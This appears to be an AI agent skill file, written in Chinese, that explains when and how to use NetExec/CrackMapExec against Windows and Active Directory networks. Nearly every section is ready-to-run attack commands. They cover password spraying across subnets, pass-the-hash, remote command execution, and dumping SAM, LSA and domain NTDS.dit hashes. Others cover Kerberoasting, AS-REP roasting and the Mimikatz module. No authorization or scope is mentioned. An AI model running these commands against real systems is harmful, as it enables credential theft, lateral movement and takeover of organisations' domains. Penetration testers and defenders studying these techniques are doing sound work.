---
name: nxc-cme
description: "使用 NetExec (nxc) / CrackMapExec (cme) 进行 Windows/AD 网络批量操作。当需要批量验证凭据、密码喷洒、远程命令执行、共享枚举、凭据导出时使用。nxc 是 CrackMapExec 的继任者，支持 SMB/WinRM/LDAP/MSSQL/SSH/RDP/FTP/WMI 等协议。在域渗透中用于批量操作——用一条命令对整个网段做凭据验证或命令执行。涉及 CrackMapExec、NetExec、nxc、cme、密码喷洒、SMB 批量、域用户枚举的场景使用此技能"
metadata:
  tags: "nxc,netexec,cme,crackmapexec,smb,winrm,ldap,密码喷洒,凭据,域,横向移动,批量,spray"
  category: "tool"
---

# NetExec (nxc) / CrackMapExec (cme)

nxc（NetExec）是 CrackMapExec 的继任者——命令语法几乎相同，但 nxc 更新更活跃。如果目标机器上只有 cme，用法一样，把 `nxc` 换成 `cme` 即可。

核心价值：**一条命令操作整个网段**——批量验证凭据、喷洒密码、远程执行、枚举信息。

项目地址：
- NetExec: https://github.com/Pennyw0rth/NetExec
- CrackMapExec: https://github.com/Porchetta-Industries/CrackMapExec

## 凭据验证

```bash
# 密码认证
nxc smb 10.0.0.0/24 -u admin -p 'P@ssw0rd'

# NTLM 哈希传递
nxc smb 10.0.0.0/24 -u admin -H NTLM_HASH

# 本地管理员（不用域认证）
nxc smb 10.0.0.0/24 -u administrator -p 'password' --local-auth

# 输出中 [+] 表示认证成功，(Pwn3d!) 表示有管理员权限
```

## 密码喷洒

```bash
# 一个密码试所有用户（安全，不触发锁定）
nxc smb DC_IP -u users.txt -p 'Summer2024!' --continue-on-success

# 多密码喷洒（注意锁定策略）
nxc smb DC_IP -u users.txt -p passwords.txt --continue-on-success --no-bruteforce

# WinRM 协议喷洒
nxc winrm 10.0.0.0/24 -u admin -p 'password'
```

## 远程命令执行

```bash
# 通过 SMB 执行命令
nxc smb TARGET -u admin -p 'password' -x "whoami"
nxc smb TARGET -u admin -p 'password' -x "type C:\flag.txt"

# 通过 WinRM 执行
nxc winrm TARGET -u admin -p 'password' -x "ipconfig"

# PowerShell 执行
nxc smb TARGET -u admin -p 'password' -X "Get-Process"

# 批量执行（整个网段）
nxc smb 10.0.0.0/24 -u admin -p 'password' -x "hostname" --continue-on-success
```

## 信息枚举

```bash
# SMB 共享枚举
nxc smb TARGET -u user -p 'password' --shares

# 用户枚举
nxc smb DC_IP -u user -p 'password' --users

# 组枚举
nxc smb DC_IP -u user -p 'password' --groups

# 密码策略
nxc smb DC_IP -u user -p 'password' --pass-pol

# 会话枚举（看谁登录了哪台机器）
nxc smb 10.0.0.0/24 -u user -p 'password' --sessions

# 已登录用户
nxc smb 10.0.0.0/24 -u user -p 'password' --loggedon-users
```

## 凭据导出

```bash
# SAM 导出（本地哈希）
nxc smb TARGET -u admin -p 'password' --sam

# LSA 导出
nxc smb TARGET -u admin -p 'password' --lsa

# NTDS.dit 导出（域控上的所有域用户哈希）
nxc smb DC_IP -u admin -p 'password' --ntds

# 搭配 hashcat 破解
nxc smb DC_IP -u admin -p 'password' --ntds | tee ntds_dump.txt
```

## LDAP 操作

```bash
# LDAP 用户枚举
nxc ldap DC_IP -u user -p 'password' --users

# 查找 Kerberoastable 账户
nxc ldap DC_IP -u user -p 'password' --kerberoasting output.txt

# AS-REP Roasting
nxc ldap DC_IP -u user -p 'password' --asreproast output.txt

# 域信任
nxc ldap DC_IP -u user -p 'password' --trusted-for-delegation
```

## MSSQL

```bash
# MSSQL 凭据验证
nxc mssql 10.0.0.0/24 -u sa -p 'password'

# 执行 SQL
nxc mssql TARGET -u sa -p 'password' -q "SELECT name FROM master.dbo.sysdatabases"

# xp_cmdshell 执行
nxc mssql TARGET -u sa -p 'password' -x "whoami"
```

## 模块系统

```bash
# 列出可用模块
nxc smb -L

# 使用 Mimikatz 模块
nxc smb TARGET -u admin -p 'password' -M mimikatz

# 使用 Spider 模块（搜索共享中的敏感文件）
nxc smb TARGET -u user -p 'password' -M spider_plus

# WebDAV 检测
nxc smb TARGET -u user -p 'password' -M webdav
```

## 决策树

```
nxc vs impacket 怎么选？
├─ 批量操作（整个网段）→ nxc（一条命令做完）
├─ 单目标深度操作 → impacket（更灵活）
├─ 密码喷洒 → nxc（内置 --no-bruteforce）
├─ 凭据导出 → 都行（nxc --sam/--ntds 或 secretsdump）
├─ NTLM 中继 → impacket ntlmrelayx
└─ Kerberos 攻击 → impacket（更完整）
```
